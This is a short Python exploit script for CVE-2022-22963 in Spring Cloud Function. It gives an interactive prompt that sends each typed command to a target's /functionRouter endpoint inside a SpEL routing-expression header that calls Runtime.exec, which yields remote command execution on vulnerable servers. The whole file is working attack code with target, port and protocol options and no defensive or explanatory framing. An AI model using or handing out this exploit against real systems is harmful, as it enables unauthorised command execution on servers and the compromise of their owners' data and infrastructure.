from cmd import Cmd
import argparse
import requests

class terminal(Cmd):
    
    def __init__(self, host, port, protocol, endpoint):
        self.host = host
        self.port = port
        self.protocol = protocol
        self.endpoint = endpoint
        
        self.prompt = f"SpringCloud@{self.host}> "
        super().__init__()
    
    def default(self, line):
        header = f"T(java.lang.Runtime).getRuntime().exec('{line}')"
        headers = {"spring.cloud.function.routing-expression":header}
        
        target = f"{self.protocol}://{self.host}:{self.port}/{self.endpoint}"
        req = requests.post(target, headers=headers, data="data")
        
parser = argparse.ArgumentParser(prog="spingCloudShell.py", description="Sends commands to a Spring App vulnerable to CVE-2022-22963")
parser.add_argument("host", help="Host to target")
parser.add_argument("-p", "--port", help="Webserver Port")
parser.add_argument("-P", "--protocol", help="Webserver Protocol e.g. http or https")
parser.add_argument("-e", "--endpoint", help="Endpoint for exploit - default /functionRouter")
args = parser.parse_args()

#defaults
if args.port is None:
    args.port = 8080
if args.protocol is None:
    args.protocol = "http"
if args.endpoint is None:
    args.endpoint = "functionRouter"
        
t = terminal(args.host, args.port, args.protocol, args.endpoint)
t.cmdloop()
